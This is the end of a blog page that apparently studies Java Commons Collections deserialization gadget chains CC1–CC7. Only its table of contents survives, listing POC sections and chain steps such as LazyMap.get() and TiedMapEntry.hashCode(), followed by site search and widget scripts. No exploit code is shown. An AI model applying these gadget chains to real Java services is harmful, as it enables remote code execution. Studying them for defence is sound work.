          AnnotationInvocationHandler.readObject()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AnnotationInvocationHandler-invoke"><span class="toc-text">
          AnnotationInvocationHandler.invoke()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap-get"><span class="toc-text">
          LazyMap.get()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CC2"><span class="toc-text">
          二、CC2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC-8u40-1"><span class="toc-text">
          JAVA源码版本-8u40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-1"><span class="toc-text">
          限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-1"><span class="toc-text">
          POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-3"><span class="toc-text">
          解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PriorityQueue-readObject"><span class="toc-text">
          PriorityQueue.readObject()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PriorityQueue-heapify"><span class="toc-text">
          PriorityQueue.heapify()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PriorityQueue-siftDown"><span class="toc-text">
          PriorityQueue.siftDown()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PriorityQueue-siftDownUsingComparator"><span class="toc-text">
          PriorityQueue.siftDownUsingComparator()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformingComparator-comparator"><span class="toc-text">
          TransformingComparator.comparator()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81CC3"><span class="toc-text">
          三、CC3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC-8u40-2"><span class="toc-text">
          JAVA源码版本-8u40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-2"><span class="toc-text">
          限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-2"><span class="toc-text">
          POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-4"><span class="toc-text">
          解析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81CC4"><span class="toc-text">
          四、CC4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC-8u40-3"><span class="toc-text">
          JAVA源码版本-8u40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-3"><span class="toc-text">
          限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-3"><span class="toc-text">
          POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-5"><span class="toc-text">
          解析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81CC5"><span class="toc-text">
          五、CC5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC-8u40-4"><span class="toc-text">
          JAVA源码版本-8u40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-4"><span class="toc-text">
          限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-4"><span class="toc-text">
          POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-6"><span class="toc-text">
          解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException-readObject"><span class="toc-text">
          BadAttributeValueExpException.readObject()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry-toString-gt-getValue"><span class="toc-text">
          TiedMapEntry.toString()-&gt;getValue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap-get-1"><span class="toc-text">
          LazyMap.get()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8"><span class="toc-text">
          🔺注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E7%BB%84"><span class="toc-text">
          无数组</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81CC6"><span class="toc-text">
          六、CC6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC-8u40-5"><span class="toc-text">
          JAVA源码版本-8u40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-5"><span class="toc-text">
          限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc"><span class="toc-text">
          Poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-7"><span class="toc-text">
          解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashSet-readObject"><span class="toc-text">
          HashSet.readObject()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-put"><span class="toc-text">
          HashMap.put()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry-hashCode"><span class="toc-text">
          TiedMapEntry.hashCode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap-get-2"><span class="toc-text">
          LazyMap.get()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8-1"><span class="toc-text">
          🔺注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Hashset%E8%AE%BE%E7%BD%AE"><span class="toc-text">
          1.Hashset设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-HashMap%E8%AE%BE%E7%BD%AE"><span class="toc-text">
          2.HashMap设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-writeObject%E5%92%8CreadObject%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-text">
          3.writeObject和readObject的关系</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC3%E7%9A%84HashMap%E7%89%88%E6%9C%AC"><span class="toc-text">
          CC3的HashMap版本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-5"><span class="toc-text">
          POC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81CC7"><span class="toc-text">
          七、CC7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E6%BA%90%E7%A0%81%E7%89%88%E6%9C%AC-8u40-6"><span class="toc-text">
          JAVA源码版本-8u40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-6"><span class="toc-text">
          限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc-1"><span class="toc-text">
          Poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-8"><span class="toc-text">
          解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable-readObject"><span class="toc-text">
          Hashtable.readObject()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable-reconstitutionPut"><span class="toc-text">
          Hashtable.reconstitutionPut()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap-equals-AbstractMapDecorator-equals"><span class="toc-text">
          LazyMap.equals()&#x3D;&#x3D;AbstractMapDecorator.equals()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AbstractMap-equals"><span class="toc-text">
          AbstractMap.equals()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap-get-3"><span class="toc-text">
          LazyMap.get()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8-2"><span class="toc-text">
          🔺注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-hashtable-put%E4%B8%A4%E6%AC%A1"><span class="toc-text">
          1.hashtable.put两次</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E5%B0%84%E8%AE%BE%E7%BD%AECCI%E9%93%BE%E5%AD%90"><span class="toc-text">
          2.反射设置CCI链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-hash%E7%A2%B0%E6%92%9E"><span class="toc-text">
          3.hash碰撞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-remove%E5%BF%85%E8%A6%81%E6%80%A7"><span class="toc-text">
          4.remove必要性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">
          总结</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">121</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">66</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">63</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>